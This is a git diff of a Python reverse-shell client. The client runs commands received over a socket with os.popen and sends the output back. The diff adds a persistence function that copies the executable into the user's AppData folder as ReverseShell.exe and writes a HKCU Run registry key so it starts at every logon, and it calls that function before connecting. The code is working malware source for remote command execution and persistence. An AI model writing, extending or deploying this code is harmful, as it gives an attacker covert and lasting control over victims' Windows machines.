@@ -28,8 +28,7 @@ def shell():
             reliable_send("exiting...")
             break
         try:
-            # open a process to run commands on shell
-            proc = os.popen(cmd)
+            proc = os.popen(cmd)  # open a process to run commands on shell
             res = proc.read()  # command result
             reliable_send(res)
         except:
@@ -51,7 +50,19 @@ def reliable_recv():
             continue
 
 
+# write on Windows registry to autorun on startup
+def persistence():
+    location = os.environ["appdata"] + "\\ReverseShell.exe"  # C:\Users\<user>\AppData\Roaming\ReverseShell.exe
+    if not os.path.exists(location):
+        # Copy this .exe file into the specified location
+        shutil.copyfile(sys.executable, location)
+        # Add register key to HKEY_CURRENT_USER autorun allowed services (Microsoft\Windows\...\Run)
+        # name the entry (/v), define the common register Type (/t), define the Data part (/d)
+        os.popen('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ReverseShell /t REG_SZ /d "' + location + '"')
+
+
 if __name__ == '__main__':
+    persistence()
     client()
     shell()
     s.close()
